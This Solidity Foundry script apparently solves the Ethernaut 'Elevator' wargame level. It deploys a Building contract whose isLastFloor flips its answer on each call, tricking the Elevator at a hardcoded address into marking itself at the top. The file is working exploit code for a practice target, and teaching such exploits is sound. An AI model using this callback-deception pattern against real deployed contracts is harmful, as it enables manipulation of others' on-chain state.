// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import {Elevator} from "src/Elevator.sol";

contract Building {
    Elevator elevator;
    bool top = true;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function isLastFloor(uint256) external returns (bool) {
        top = !top;
        return top;
    }

    function callGoTo() external {
        elevator.goTo(10);
    }
}

contract Solve is Script {
    Elevator elevator;
    address instanceAddr = 0xBc969b422c0aD762D0347f77d5FB97ed4120C2FF;

    function run() external {
        vm.startBroadcast();
        Building building = new Building(Elevator(instanceAddr));
        building.callGoTo();
        vm.stopBroadcast();
    }
}
